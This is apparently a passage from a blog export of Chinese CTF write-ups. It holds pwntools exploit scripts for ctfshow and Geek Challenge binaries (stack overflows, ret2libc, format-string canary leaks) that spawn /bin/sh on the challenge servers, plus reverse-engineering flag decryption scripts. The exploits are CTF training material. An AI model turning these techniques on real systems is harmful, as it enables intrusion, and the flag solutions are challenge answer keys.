+p32(binsh_addr)\n\n\np.sendline(payload2)\n\n\np.interactive()\n```\n\n![img](https://uploader.shimo.im/f/ugqnlZvDfD07Ok7r.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTcwOTIxOTAsImZpbGVHVUlEIjoiMTZxOE1sMmFqUkZsMGFrNyIsImlhdCI6MTY5NzA5MTg5MCwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NTMwNjgyNn0.j617JLzCUeglnHIFCn7P5vJvbMP6E3K2bjpGv-1cNc0)\n\n \n\n### pwn(4)\n\n格式化字符串，难一点的做法\n\n`[ctfshow pwn4_ctfshow pwn04_whit233的博客-CSDN博客](https://blog.csdn.net/qq_39980610/article/details/126461902)\n\n```\nfrom pwn import *\n\n\np = remote('pwn.challenge.ctf.show',28106)\n# p = process('ex2 (1)')\n\n\nsystem = 0x080485AF\n\n\npayload1 = '%31$x'\np.sendline(payload1)\np.recvuntil('\\n')\ncanary = int(p.recv(8),16)\nprint(hex(canary))\n\n\npayload2 = b'a'*100 + p32(canary) + b'a'*12 + p32(system)\n\n\np.sendline(payload2)\n\n\np.interactive()\n```\n\n \n\n### pwn（6）\n\n简单的栈溢出，主要练习64位的题\n\n```\nfrom pwn import *\n\n\ncontext.log_level = 'debug'\n\n\np = remote(\"pwn.challenge.ctf.show\",28110)\n\n\nelf = ELF('./pwn')\n\n\nsystem_addr = 0x000000000040057B\n\n\npop_rdi = 0x0000000000400643\n\n\nprint(hex(system_addr))\n\n\npayload = b'a'*20 + p64(pop_rdi) + p64(system_addr) + p64(system_addr)\n\n\np.sendline(payload)\n\n\np.interactive()\n```\n\n![img](https://uploader.shimo.im/f/xp4GMcBPmsv4tHpE.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTcwOTIxOTAsImZpbGVHVUlEIjoiMTZxOE1sMmFqUkZsMGFrNyIsImlhdCI6MTY5NzA5MTg5MCwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NTMwNjgyNn0.j617JLzCUeglnHIFCn7P5vJvbMP6E3K2bjpGv-1cNc0)\n\n \n\n### pwn（7）\n\n64位版的pwn（3），改一些数值就可以\n\n```\nfrom pwn import *\nfrom LibcSearcher import *\n\n\ncontext.log_level = 'debug'\n\n\np = remote(\"pwn.challenge.ctf.show\",28112)\n\n\n#p = process('./stack1')\n\n\nelf = ELF('./pwn')\n\n\ngot_addr = elf.got['puts']\n\n\nplt_addr = elf.plt['puts']\n\n\nmain_addr = elf.symbols['main']\n\n\npop_rdi = 0x00000000004006e3\n\n\npop_rsi_r15 = 0x00000000004006e1\n\n\npayload = b'a'*20 + p64(pop_rdi) + p64(got_addr) + p64(plt_addr) + p64(main_addr)\nprint(payload)\n\n\np.sendline(payload)\n\n\np.recvline()\n\n\nputs_addr=u64(p.recv(6).ljust(8,b'\\x00')) #将其中的前6个字节（因为这里用的是Little Endian字节序）转换成unsigned long long类型的整数，\n\n\nprint(hex(puts_addr))\n\n\nlibc = LibcSearcher(\"puts\",puts_addr)\n\n\nlibcsase = puts_addr - libc.dump(\"puts\") \n\n\nsystem_addr = libcsase + libc.dump(\"system\")\n\n\nbinsh_addr = libcsase + libc.dump(\"str_bin_sh\")\n\n\nret_addr = 0x00000000004004c6\n\n\npayload2 = b'a'*20 + p64(ret_addr) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)\n\n\np.sendline(payload2)\n\n\np.interactive()\n```\n\n![img](https://uploader.shimo.im/f/LoBqZZI5JKEsHZTF.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTcwOTIxOTAsImZpbGVHVUlEIjoiMTZxOE1sMmFqUkZsMGFrNyIsImlhdCI6MTY5NzA5MTg5MCwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NTMwNjgyNn0.j617JLzCUeglnHIFCn7P5vJvbMP6E3K2bjpGv-1cNc0)\n\n \n\n### pwn（10）\n\n经典格式化字符串题目\n\n[ctfshow—pwn10 - anweilx - 博客园 (cnblogs.com)](https://www.cnblogs.com/anweilx/p/12693406.html)\n\n```\nfrom pwn import *\n\n\np = remote('pwn.challenge.ctf.show',28104)\n#p = process(\"./pwn1\")\nnum_addr = 0x0804A030\npayload = p32(num_addr)+b\"aaaaaaaaaaaa%7$n\"\np.sendline(payload)\np.interactive()\n```\n\n![img](https://uploader.shimo.im/f/Ou6kePLwJWx3nIue.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTcwOTIxOTAsImZpbGVHVUlEIjoiMTZxOE1sMmFqUkZsMGFrNyIsImlhdCI6MTY5NzA5MTg5MCwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NTMwNjgyNn0.j617JLzCUeglnHIFCn7P5vJvbMP6E3K2bjpGv-1cNc0)\n\n\n\n\n\n"},{"title":"奇怪的wp","url":"/2023/10/08/奇怪的wp/","content":"\n\n\n#### PWN1\n\n``` python\nfrom pwn import *\n# p = process('./ezshellcode')\np = remote('pwn.node.game.sycsec.com',30213)\ncontext(arch='amd64', os='linux')\ncontext.log_level = 'DEBUG'\n\n\n\np.recvuntil(b'my heart')\np.sendline(b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaSyclover')\n\np.recvuntil(b'challege!')\np.recvline()\np.recvline()\na=p.recvline().decode('utf-8')\na = a[0:-3]\nprint(6666666666)\nprint(a)\nr = eval(a)\np.sendline(str(r))\np.interactive()\n```\n\n## ret2text\n\nPIE手动爆破,填充数据不是0x50\n\n``` python\nfrom pwn import *\n\ncontext.log_level = 'debug'\n\n# context.terminal = ['gnome-terminal', '-x', 'sh', '-c']\n# r = gdb.debug('./ret2text')\n# r = process('./ret2text')\n\nr = remote('pwn.node.game.sycsec.com',31949)\n\ndef debug():\n    gdb.attach(r)\n    pause()\nelf = ELF('ret2text')\nse      = lambda data               :r.send(data)\nsa      = lambda delim,data         :r.sendafter(delim, data)\nsl      = lambda data               :r.sendline(data)\nsla     = lambda delim,data         :r.sendlineafter(delim, data)\nsea     = lambda delim,data         :r.sendafter(delim, data)\nrc      = lambda numb=4096          :r.recv(numb)\nrl      = lambda                    :r.recvline()\nru      = lambda delims             :r.recvuntil(delims)\nuu32    = lambda data               :u32(data.ljust(4, b'\\0'))\nuu64    = lambda data               :u64(data.ljust(8, b'\\0'))\nlic \t= lambda data               :uu64(ru(data)[-6:])\npadding = lambda lenth              :b'Yhuan'*(lenth//5)+b'Y'*(lenth % 5)\nit      = lambda                    :r.interactive()\n\npad = p64(0)*9 + p64(1)\nbackdoor = b'\\x27\\xA2'\n\npl1 = pad + p64(0) + backdoor\nse(pl1)\n\nr.interactive()\n```\n\n\n\n\n\n\n\n\n\n## ret2libc\n\nlibcsearcher\n\n``` python\n#coding:utf-8\nfrom pwn import *\nfrom LibcSearcher import*\n# sh = process('./chal')\nsh = remote('pwn.node.game.sycsec.com',31971)\nelf = ELF('./chal')\n# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\n# libc = ELF('../../tools/libc-database/db/libc6_2.23-0ubuntu10_amd64.so')\n# libc = ELF('libc.so.6')\ncontext(arch='amd64', os='linux')\ncontext.log_level = 'DEBUG'\n# context.terminal = ['tmux','splitw','-h']\ngadgets1 = 0x000000000040132A\ngadgets2 = 0x0000000000401310\nwrite_got = elf.got['write']\nmain_addr = elf.symbols['main']\noffset = b'\\0'*(0x10+8)\ndef csu(r12,r13,r14,r15,ret_addr):\n    payload = offset\n    payload += p64(gadgets1)\n    # payload += b\"\\0\"*8\n    payload += p64(0)\n    payload += p64(1)\n    payload += p64(r12)\n    payload += p64(r15)\n    payload += p64(r14)\n    payload += p64(r13)\n    payload += p64(gadgets2) \n    payload += b\"\\0\"*56\n    payload += p64(ret_addr)\n    sh.sendline(payload)\n# sh.recvuntil(\"this\\n\")\ncsu(1,write_got,8,write_got,main_addr)\nwrite_addr = u64(sh.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\0'))\nprint(hex(write_addr))\n# offset_addr = write_addr - libc.symbols['write']\n# success(\"offset_addr = 0x%x\",offset_addr)\nlibc = LibcSearcher('write',write_addr)\nbase = write_addr - libc.dump('write')\nsystem = base + libc.dump('system')\nbinsh = base + libc.dump('str_bin_sh')\n# print(\"123\"+libc.dump('str_bin_sh'))\n# system_addr = offset_addr + libc.symbols['system']\n# print(\"execve:\",hex(system_addr))\n# binsh_address = next(libc.search(b'/bin/sh\\x00'))\n# print(\"binsh:\",hex(binsh_address))\n#gdb.attach(sh)\nsh.recvuntil(\"this\\n\")\npayload = offset\npayload+= p64(0x000000000040101a)#ret_addr\npayload+= p64(0x0000000000401333)# pop_rdi_ret\npayload+= p64(binsh)\npayload+= p64(system)\nsh.sendline(payload)\nsh.interactive()\n```\n\n提供的libc做\n\n``` python\n#coding:utf-8\nfrom pwn import *\n# from LibcSearcher import*\n# sh = process('./chal')\nsh = remote('pwn.node.game.sycsec.com',31971)\nelf = ELF('./chal')\n# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\n# libc = ELF('../../tools/libc-database/db/libc6_2.23-0ubuntu10_amd64.so')\nlibc = ELF('libc.so.6')\ncontext(arch='amd64', os='linux')\ncontext.log_level = 'DEBUG'\n# context.terminal = ['tmux','splitw','-h']\ngadgets1 = 0x000000000040132A\ngadgets2 = 0x0000000000401310\nwrite_got = elf.got['write']\nmain_addr = elf.symbols['main']\noffset = b'\\0'*(0x10+8)\ndef csu(r12,r13,r14,r15,ret_addr):\n    payload = offset\n    payload += p64(gadgets1)\n    # payload += b\"\\0\"*8\n    payload += p64(0)\n    payload += p64(1)\n    payload += p64(r12)\n    payload += p64(r15)\n    payload += p64(r14)\n    payload += p64(r13)\n    payload += p64(gadgets2) \n    payload += b\"\\0\"*56\n    payload += p64(ret_addr)\n    sh.sendline(payload)\n# sh.recvuntil(\"this\\n\")\ncsu(1,write_got,8,write_got,main_addr)\nwrite_addr = u64(sh.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\0'))\nprint(hex(write_addr))\noffset_addr = write_addr - libc.symbols['write']\nsuccess(\"offset_addr = 0x%x\",offset_addr)\n# libc = LibcSearcher('write',write_addr)\n# base = write_addr - libc.dump('write')\n# system = base + libc.dump('system')\n# binsh = base + libc.dump('str_bin_sh')\n# print(\"123\"+libc.dump('str_bin_sh'))\nsystem_addr = offset_addr + libc.symbols['system']\nprint(\"execve:\",hex(system_addr))\nbinsh_address = next(libc.search(b'/bin/sh\\x00'))\nprint(\"binsh:\",hex(binsh_address))\n#gdb.attach(sh)\nsh.recvuntil(\"this\\n\")\npayload = offset\npayload+= p64(0x000000000040101a)#ret_addr\npayload+= p64(0x0000000000401333)# pop_rdi_ret\npayload+= p64(offset_addr+binsh_address)\npayload+= p64(system_addr)\nsh.sendline(payload)\nsh.interactive()\n```\n\n## password\n\n``` python\nfrom pwn import *\n\ncontext.log_level = 'debug'\n\n# context.terminal = ['gnome-terminal', '-x', 'sh', '-c']\n# p = gdb.debug('./password')\n# p = process('./password')\n\np = remote('pwn.node.game.sycsec.com',31300)\n\n# res = b'wrong'\nret = 0x000000000040101a\nfor i in range(1000):\n    p = remote('pwn.node.game.sycsec.com',31300)\n    # p = process('./password')\n    pad = b'\\0'*0x28\n    backdoor = p64(0x4012F3)\n    pl1 = pad + backdoor\n    p.send(pl1)\n    p.recvuntil(b'password:\\n')\n    p.sendline(b'\\x00')\n    res = p.recvline()\n    if b'Correct' in res:\n        print('ok')\n        break\np.interactive()\n# res = b'wrong'\n# while b'wrong' in res:\n#     p = process('./password')\n#     pad = b'a'*0x20\n#     backdoor = p64(0x4012F3)\n#     pl1 = pad + backdoor\n#     p.sendline(pl1)\n#     p.recvuntil('password:')\n#     p.sendline(b'')\n#     res = p.recvall()\n\n```\n\n\n\n## write1\n\n[[BUUCTF\\]PWN——wustctf2020_name_your_cat（数组越界）_pwn ctf 越界写-CSDN博客](https://blog.csdn.net/mcmuyanga/article/details/114673240)\n\n这个题目和我们做的才差不多，都是通过数据越界然后修改地址，但要注意数组是一个字节一个字节的，这个题目是8个字节8个字节的，所以可以直接使用p64(地址)\n\n``` c\n *(v2 + v1) += tmp;\n```\n\n这个关键的语句，不是=，所以不是覆盖，我们要输入数值，然后让这个地址加减数值，让他等于我们的返回地址\n\n我们gdb动调一下，可以看到我们输入下表位41，然后值为-1的时候，他的返回地址从40134D变成了40124D，这就是我们这个的目的，我们要把他变成我们的返回地址\n\n![image-20231029221238038](C:\\Users\\a\\AppData\\Roaming\\Typora\\typora-user-images\\image-20231029221238038.png)\n\n``` python\nfrom pwn import *\n\ncontext.log_level = 'debug'\ncontext(arch='amd64', os='linux')\n# p=process('chal')\np=remote('pwn.node.game.sycsec.com',31277)\n# p=gdb.debug('./chal')\n# p=remote(\"node3.buuoj.cn\",28477)\n#p=process('./wustctf2020_name_your_cat')\n# elf=ELF('./wustctf2020_name_your_cat')\n\nshell_addr=0x401221\n\np.sendline(b'aaaaaaaaaaa')\n\np.sendlineafter('index:\\n',b'41')\np.sendlineafter(\"value:\",b'-1')\n\np.sendlineafter('index:\\n',b'40')\np.sendlineafter(\"value:\",b'-2b')\n\np.sendlineafter('index:\\n',b'-1')\n\n\np.interactive()\n\n```\n\n# re\n\n``` python\na=\"Z`J[X^LMNO`PPJPVQRSIUTJ]IMNOZKMM\"\na=list(a)\nfor i in range(len(a)):\n    print(chr(ord(a[i])-7),end='')\n```\n\n\n\n## 砍树\n\n``` python\nenc =[\n  0x00, 0x20, 0x20, 0x17, 0x1B, 0x36, 0x0E, 0x36, 0x26, 0x17, \n  0x04, 0x2A, 0x29, 0x07, 0x26, 0x15, 0x52, 0x33, 0x2D, 0x0F, \n  0x3A, 0x27, 0x11, 0x06, 0x33, 0x07, 0x46, 0x17, 0x3D, 0x0A, \n  0x3C, 0x38, 0x2E, 0x22, 0x18\n]\n\nkey = \"Sycloverforerver\"\n\nfor i in range(len(enc)):\n    enc[i]=enc[i]^ord(key[i%len(key)])\n    print(chr(int(enc[i])),end='')\n\n# print(0x1B^ord('{'))\n```\n\n## 听说cpp很难？\n\n``` python\na=[77, 95, 61, 55, 104, 115, 87, 39, 104, 81, 89, 127, 38, 107, 89, 115, 87, 85, 91, 89, 111, 106, 89, 39, 87, 114, 87, 79, 87, 120, 120]\n\nfor i in range(len(a)):\n    a[i]=((a[i]+10)^10)-10\n    print(chr(a[i]),end='')\n\n# print((71^ 10)-10)\n```\n\n## rainbow\n\n``` python\nida_chars =[\n  0x65, 0x58, 0x41, 0x8E, 0x50, 0x44, 0x7B, 0x62, 0x57, 0x4A, \n  0x7E, 0x54, 0x49, 0x6C, 0x7D, 0x84, 0x4F, 0x5B, 0x95, 0x60, \n  0x60, 0x64, 0x77, 0x48, 0x7D, 0x4D, 0x7B, 0x9F, 0x68, 0x3C, \n  0x2D, 0x62\n]\n\nfor i in range(len(ida_chars)):\n    ida_chars[i]^=i\n    # print(chr(ida_chars[i]),end='')\n# q=1\nfor i in range(len(ida_chars)):\n    if(i%3==0):\n        ida_chars[i]-=18\n    print(chr(ida_chars[i]),end='')\n```\n\n\n\n## 小黄鸭\n\n直接爆破，有个坑点原题目中\n\nif chr(ord(a[1])) != 's' or ord(a[2]) != 109 or chr(ord(a[17])) != 'C':\n\n意思其实就是告诉我们倒数第三个数是m，服了\n\n``` c\n#include<stdio.h>\n#include<string.h>\n\nint main()\n{\n\tchar a[] = { 'H', 'N', 'R', '|', '2', '`', 'w', '1', 'e', 't', '`', 'n', 'D', 'j', '`', 'R', 'w', 'P', 'h', 't', '`', 'N', 'd', 'J', 'g', '`', 's', 'g', '4', 'p', '|', 'h', '~' };\n\tint i, j, k;\n\tfor(i=0;i< 33;i++)\n\t\tfor (k = 32; k < 127; k++)\n\t\t{\n\t\t\tj = k;\n\t\t\tif (j >= 'a' && j <= 'z')\n\t\t\t{\n\t\t\t\tj += 13;\n\t\t\t\tif (j <= 'a' || j >= 'z')\n\t\t\t\t\tj -= 26;\n\t\t\t\tj += 2;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tif (j >= 'A' && j <= 'Z')\n\t\t\t\t{\n\t\t\t\t\tj += 13;\n\t\t\t\t\tif (j <= 'A' || j >= 'Z')\n\t\t\t\t\t\tj -= 26;\n\t\t\t\t\tj += 2;\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tj += 1;\n\t\t\t\t}\n\n\t\t\t}\n\t\t\tif (j == a[i])\n\t\t\t{\n\t\t\t\tprintf(\"%c\", k);\n\t\t\t}\n\t\t}\n\treturn 0;\n}\n```\n\n## flower-or-tea\n\n[TEA系列加密解密 | Gruge's Blog (g2uge.github.io)](https://g2uge.github.io/2022/02/28/TEA系列加密解密/)\n\n第一次真正的接触tea加密，了解了tea，xtea和xxtea加密的特征\n\n这个题的坑点一是，他的数据接收是从前从后往中间聚集，其实这个无所谓，直接解出flag后面自己改就好了\n\n坑点二，这是一个xtea，他修改了常量和循环次数，其实这俩也是套脚本稍微一改就可以了\n\n坑点三，原加密函数,中(*(key + 4 * ((sum >> 11) & 3))，中的4其实是混淆用的，因为他是取的地址，所以我们可以使用这个代替\n\n``` python\nint __cdecl tea(unsigned int a1, unsigned int *enc, int key)\n{\n  int result; // eax\n  unsigned int i; // [esp+8h] [ebp-10h]\n  unsigned int v1; // [esp+Ch] [ebp-Ch]\n  unsigned int v0; // [esp+10h] [ebp-8h]\n  unsigned int sum; // [esp+14h] [ebp-4h]\n\n  v0 = *enc;\n  v1 = enc[1];\n  sum = 0;\n  for ( i = 0; i < a1; ++i )\n  {\n    v1 += sum ^ (*(key + 4 * ((sum >> 11) & 3)) + sum) ^ (v0 + ((v0 >> 5) ^ (16 * v0)));\n    v0 += (*(key + 4 * (sum & 3)) + sum) ^ (v1 + ((v1 >> 5) ^ (16 * v1)));\n    sum += 0x31415927;\n  }\n  *enc = v0;\n  result = 4;\n  enc[1] = v1;\n  return result;\n}\n```\n\n\n\n```python\n    v1 += (((v0 << 4) ^ (v0 >> 5)) + v0) ^ ((sum + key[ ((sum >> 11) & 3)])^sum);\n    v0 += (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + key[(sum & 3)]);\n```\n\n\n\n\n\n坑点四，解密代码记得按照逻辑把代码都取反\n\n解密脚本：\n\n\n\n``` c\n#include <stdio.h>\n#include <stdint.h>\n\n/* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] - key[3] */\n\nvoid encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) {\n    unsigned int i;\n    uint32_t v0 = v[0], v1 = v[1], sum = 0, delta = 0x31415927;\n    for (i = 0; i < num_rounds; i++) {\n        v1 += (((v0 << 4) ^ (v0 >> 5)) + v0) ^ ((sum + key[ ((sum >> 11) & 3)])^sum);\n        v0 += (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + key[(sum & 3)]);\n        sum += delta;\n    }\n    v[0] = v0; v[1] = v1;\n    printf(\"加密后的数据：%u %u\\n\", v[0], v[1]);\n}\n\nvoid decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) {\n    unsigned int i;\n    uint32_t v0 = v[0], v1 = v[1], delta = 0x31415927, sum = delta * num_rounds;\n    for (i = 0; i < num_rounds; i++) {\n        sum -= delta;\n        v0 -= (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + key[(sum & 3)]);\n        v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ ((sum + key[((sum >> 11) & 3)]) ^ sum);\n    }\n    v[0] = v0; v[1] = v1;\n    printf(\"解密后的数据：%u %u\\n\", v[0], v[1]);\n}\n\nint main()\n{\n    uint32_t v[38] = { 0x9AF9464B, 0xC417B89E, 0xB217A713, 0xC93BA9E8, 0x94F3E44E, 0xB5CC2AB5, 0x4451E42C, 0x7A8A289A,\n    0x53C8D008, 0x6E117B49, 0x9BFFD794, 0x5EFF2DF9, 0x17E72531, 0xDFBD9979, 0x8F871B3A, 0x73E8C5AC,\n    0xB28670A6, 0x5AF6A369, 0x2CF7DA24, 0x347B66AF, 0xB9C84D60, 0x911E912F, 0xBD5A2F9B, 0xCB96733A,\n    0xC59968BE, 0xA00013E9, 0xC12F4EA4, 0xDE863A10, 0xA0C4D594, 0x4380983C, 0x7E2F7648, 0xE54DDC89,\n    0x3F27A690, 0xB58D3199, 0x604AE517, 0x9C903984, 0xF4E04481, 0x3CF4EDFF };\n    uint32_t flag[2] = {0x0,0x0};\n    uint32_t pqw[2] = { 'S','}'};\n    uint32_t const k[4] = { 0x00000020, 0x0000001B, 0x00000027, 0x0000002C };\n    unsigned int i,r = 54;//num_rounds建议取值为32\n    // v为要加密的数据是两个32位无符号整数\n    // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位\n    //printf(\"加密前原始数据：%u %u\\n\", v[0],v[1]);\n    //encipher(r, v, k);\n    //printf(\"加密后的数据：%u %u\\n\", v[0], v[1]);\n    encipher(r, pqw, k);\n    for (i = 0; i < 38; i+=2)\n    {\n        flag[0] = v[i];\n        flag[1] = v[i + 1];\n        decipher(r, flag, k);\n\n   }\n    return 0;\n}\n```\n\n经过测试,这样直接套用ida里的代码也是可以的\n\n``` c\n    for (i = 0; i < num_rounds; i++) {\n    v1 += sum ^ (*(key + 1 * ((sum >> 11) & 3)) + sum) ^ (v0 + ((v0 >> 5) ^ (16 * v0)));\n    v0 += (*(key + 1 * (sum & 3)) + sum) ^ (v1 + ((v1 >> 5) ^ (16 * v1)));\n    sum += 0x31415927;\n    }\n    v[0] = v0; v[1] = v1;\n    printf(\"加密后的数据：%u %u\\n\", v[0], v[1]);\n```\n\n\n\n## 浪漫至死不渝\n\n已知加密后的数据以及密钥，直接爆破就好了\n\n``` c\n#include <stdio.h>\n#include <stdint.h>\n#include<string.h>\n\nint main()\n{\n    int enc[]={ 125, 130, 131, 122, 117, 110, 123, 125, 130, 131, 122, 117, 110, 123, 99, 99, 99, 99 };\n    int key[] = { '5','2','0','1','3','1','4','W','X','H','N' };\n    int i, j, k;\n    for (i = 14; i < 18; i++)\n    {\n        for (j = 33; j < 126; j++)\n        {\n            k = j;\n            k = j ^ key[i - 7];\n            k += 99;\n            if (k == enc[i])\n            {\n                printf(\"%c \", j);\n            }\n        }\n    }\n\n\n    return 0;\n}\n```\n\n``` c\n#include <stdio.h>\n#include <stdint.h>\n#include<string.h>\n\nint main()\n{\n    int enc[]={ 125, 130, 131, 122, 117, 110, 123, 125, 130, 131, 122, 117, 110, 123, 99, 99, 99, 99 };\n    int key[] = { '5','2','0','1','3','1','4','W','X','H','N' };\n    int i, j, k;\n    for (i = 0; i < 14; i++)\n    {\n        for (j = 33; j < 126; j++)\n        {\n            k = j;\n            k = j ^ key[i % 7];\n            k += 10;\n            if (k == enc[i])\n            {\n                printf(\"%c \", j);\n            }\n        }\n    }\n\n\n    return 0;\n}\n```\n\n## easymath\n\n做不了一点\n\n``` python\nfrom z3 import * \n\nsolver = Solver()\n\ncharset = \"01234_asdzxcpoityumnbAOZWXGMY\"\n\nflag = [BitVec('f%d'%i, 8) for i in range(26)]\n\nfor i in range(26):\n    solver.add(Or([flag[i] == ord(c) for c in charset]))\n    \nmatrix = [0x12, 0x1D, 0x10, 0x13, 0x1B, 0x08, 0x1F, 0x08, 0x17, 0x1E, 0x1D, 0x03, 0x1C, 0x0A, 0x15, 0x12, 0x1D, 0x08, 0x10, 0x1C, 0x0B, 0x1E, 0x07, 0x14, 0x07]\n\nv7 = [[BitVec('v%d_%d'%(i,j), 8) for j in range(5)] for i in range(5)]\nfor i in range(5):\n    for j in range(5):\n        for k in range(5):\n            v7[i][j] = v7[i][j] + flag[5*i+k] * matrix[5*k+j]\n            v7[i][j] = v7[i][j] & 0x1F\n\n# 对角线等于1        \nfor i in range(5):\n    solver.add(v7[i][i] == 1)\n    \n# 非对角线等于0\nfor i in range(5):\n    for j in range(5):\n        if i != j:\n            solver.add(v7[i][j] == 0)\n\n# 特定字节等于要求值        \nsolver.add(flag[1] == ord('t'))\nsolver.add(flag[7] == ord('y')) \nsolver.add(flag[17] == ord('y'))\n\nif solver.check() == sat:\n    m = solver.model()\n    res = []\n    for i in range(26):\n        res.append(m[flag[i]].as_long())\n    print(bytes(res).decode())\nelse:\n    print(\"No solution found\")\n```\n\n## mySelf\n\n对比着他的算法，抄过来就可以了，一开始是个SMC，我们需要绕过一下，然后恢复函数\n\n``` c\n#include <stdio.h>\n#include <stdint.h>\n\n/* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] - key[3] */\n\nvoid encipher(unsigned int num_rounds, uint32_t v[2]) {\n    unsigned int i;\n    uint32_t v0 = v[0], v1 = v[1], sum = 0, delta = 1640531527;\n    for (i = 0; i < num_rounds; i++) {\n        sum -= 1640531527;\n        v1 += ((v0 >> 5) + 2) ^ ((16 * v0) + 2) ^ (sum + v0);\n        v0 += ((v1 >> 5) + 4) ^ ((16 * v1) + 3) ^ (sum + v1);\n    }\n    v[0] = v0; v[1] = v1;\n    printf(\"加密后的数据：%u %u\\n\", v[0], v[1]);\n}\n\nvoid decipher(unsigned int num_rounds, uint32_t v[2]) {\n    unsigned int v0 = v[0], v1 = v[1], delta = 1640531527;\n    unsigned int i, sum = -(1640531527 * 32);\n    for (i = 0; i < 32; i++) {\n        \n        v1 -= ((v0 >> 5) + 4) ^ ((16 * v0) + 3) ^ (sum + v0);\n        v0 -= ((v1 >> 5) + 2) ^ ((16 * v1) + 2) ^ (sum + v1);\n        sum += 1640531527;\n    }\n    v[0] = v0; v[1] = v1;\n    printf(\"解密后的数据：%x %x\\n\", v[0], v[1]);\n}\n\nint main()\n{\n    uint32_t v[8] = { 0xBDBDF9F0, 0xE26194C4, 0x80799125, 0x1F0FC219, 0xEB6A1815, 0x84F572C5, 0x40CC3A85, 0xD2A32ABB };\n    uint32_t flag[2] = { 0x0,0x0 };\n    uint32_t pqw[2] = { 'S','Y' };\n    uint32_t const k[4] = { 0x00000020, 0x0000001B, 0x00000027, 0x0000002C };\n    unsigned int i, r = 32;//num_rounds建议取值为32\n    // v为要加密的数据是两个32位无符号整数\n    // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位\n    //printf(\"加密前原始数据：%u %u\\n\", v[0],v[1]);\n    //encipher(r, v, k);\n    //printf(\"加密后的数据：%u %u\\n\", v[0], v[1]);\n    \n    for (i = 0; i < 8; i += 2)\n    {\n        flag[0] = v[i];\n        flag[1] = v[i + 1];\n       // encipher(r, flag);\n        decipher(r, flag);\n\n    }\n    printf(\"%c\", 2157182970);\n    return 0;\n}\n```\n\n"},{"title":"SHCTF","url":"/2023/10/02/SHCTF/","content":"\n\n\n## RE\n\n### [WEEK1]ez_asm\n\n简单的asm代码，直接对照的逻辑逆向即可\n\n\n\n``` python\nflag = \"nhuo[M`7mc7uhc$7midgbTf`7`$7%#ubf7 ci5Y\" \n\nfor i in range(len(flag)):\n  \n  c = flag[i] \n  c = ord(c)+0xA\n  flag = flag[:i] + chr(c) + flag[i+1:]\n\n  c = flag[i]\n  c = ord(c)^0x1E\n  flag = flag[:i] + chr(c) + flag[i+1:]\n\n\n\nprint(flag)\n```\n\n### [WEEK1]easy_re\n\n他的加密算法就是把字符串的高位变到低位，地位变到高位而已，直接写代码进行替换\n\n``` python\ndes =[\n  0x66, 0xC6, 0x16, 0x76, 0xB7, 0x45, 0x27, 0x97, 0xF5, 0x47, \n  0x03, 0xF5, 0x37, 0x03, 0xC6, 0x67, 0x33, 0xF5, 0x47, 0x86, \n  0x56, 0xF5, 0x26, 0x96, 0xE6, 0x16, 0x27, 0x97, 0xF5, 0x07, \n  0x27, 0x03, 0x26, 0xC6, 0x33, 0xD6, 0xD7\n]\n\nresult = \"\"\n\nfor c in des:\n  high = (ord(chr(c)) & 0xF0) >> 4\n  low = (ord(chr(c)) & 0x0F) << 4\n  orig = high | low\n  \n  result += chr(orig)\n\nprint(result)\n```\n\n### [WEEK1]seed\n\nIDA分析得知就是简单的通过伪随机数获取10个数，然后和flag进行异或，难点在于伪随机数为多少，我们动调后发现他的伪随机数是0\n\n``` c\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <time.h>\n\nint main() {\n    unsigned char flag[50];\n    unsigned char key[10];\n    unsigned char des[45] = {\n        0x40, 0x29, 0x28, 0xE9, 0xC2, 0x04, 0xA4, 0xED, 0x9F, 0x53, 0x5F, 0x75, 0x3C, 0xD1, 0xCD, 0x2B, 0xA8,\n        0xC4, 0x89, 0x69, 0x15, 0x21, 0x16, 0xEF, 0xD7, 0x27, 0x92, 0xDF, 0xCA, 0x53, 0x5F, 0x2A, 0x3C, 0xD1,\n        0xCE, 0x03, 0xA3, 0xEF, 0xA5, 0x78, 0x16, 0x1A, 0x2D, 0xE1, 0xC4\n    }; // 密文\n\n    srand(0); // 设置随机种子为当前时间\n\n    for (int i = 0; i < 10; i++) {\n        key[i] = rand() % 255; // 随机生成key\n    }\n\n    for (int i = 0; i < 45; i++) {\n        des[i] ^= key[i % 10]; // 异或加密\n        printf(\"%c\", des[i]);\n    }\n\n    return 0;\n}\n\n```\n\n\n\n### 